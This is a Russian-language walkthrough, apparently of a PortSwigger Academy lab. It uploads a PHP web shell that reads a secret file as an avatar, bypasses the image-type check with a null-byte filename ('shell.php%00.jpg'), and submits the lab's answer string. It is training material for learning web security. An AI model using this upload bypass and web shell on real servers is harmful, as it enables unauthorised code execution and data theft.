Залогинимся под `wiener:peter` и перейдем в личный кабинет. Далее загрузим любой `.png` файл в качестве аватара, и найдем запрос в `Proxy` -> `HTTP history` и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension/pics%20for%20walktrough/1.png)
Следующим шагом вырежем из запроса выше всю внутренность `.png` файла, а вместо нее подставим внутренность шелла `<?php echo file_get_contents('/home/carlos/secret'); ?>` так же изменив имя и расшинение загружаемого файла на `shell.php`
```
POST /my-account/avatar
...
filename="shell.php"
...
<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension/pics%20for%20walktrough/2.png)
В ответ мы увидим `Sorry, only JPG & PNG files are`

Поробуем обойти данное ограничение. Добавим в расширение файла пустой байт `%00` с расширением `.jpg`, чтобы при обработке сервером был реализован следующий сценарий `shell.php%00.jpg` -> `shell.php .jpg` -> `shell.php`
```
POST /my-account/avatar
...
filename="shell.php%00.jpg"
...
<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension/pics%20for%20walktrough/3.png)
Так как наш шелл успешно загрузился. Обратимся к нему, и заставим его отработать, получив секрет УЗ `carlos`
```
GET /files/avatars/shell.php
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension/pics%20for%20walktrough/4.png)
В качетсве ответа на задание сдадим - `zNvv9zXczO5EQkhy5mJXUWZKX8Z8xcJh` и получим уведомление об успешно выполненной лабораторной работе
